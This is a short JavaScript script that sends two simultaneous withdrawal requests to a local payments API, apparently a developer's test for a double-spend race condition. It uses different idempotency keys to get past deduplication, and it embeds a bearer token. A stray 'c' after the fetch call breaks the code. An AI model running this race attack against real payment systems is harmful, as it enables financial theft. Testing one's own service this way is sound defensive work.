const BASE_URL = "http://localhost:4000/api/v1"
const TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjZhOWM0ZGU4ZjA1ZDFhMDlhZDgzNDA4MCIsImVtYWlsIjoidGVzdEAxLmNvbSIsImlhdCI6MTc4ODY3MzQwMSwiZXhwIjoxNzg4Njc0MzAxfQ.YnhWHHsFO-tNsO4ExJNPMqV0HoQNGzOiCvPLdDdVMdc"

async function attempt(key) {
    const res = await fetch(`${BASE_URL}/withdrawals`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${TOKEN}`
        },
        body: JSON.stringify({
            method: "upi",
            optionId: "upi_50", // 10,000 VEs required — pick something your current balance can only cover ONCE
            payoutDetails: { upiId: "test@okhdfc" },
            idempotency_key: key // DIFFERENT keys — this must be a genuine race, not idempotency dedup
        })
    })c
    const data = await res.json()
    console.log(`Key ${key}:`, res.status, data.message || data.code)
}

// Fire both at the exact same time
Promise.all([
    attempt("race-A"),
    attempt("race-B")
])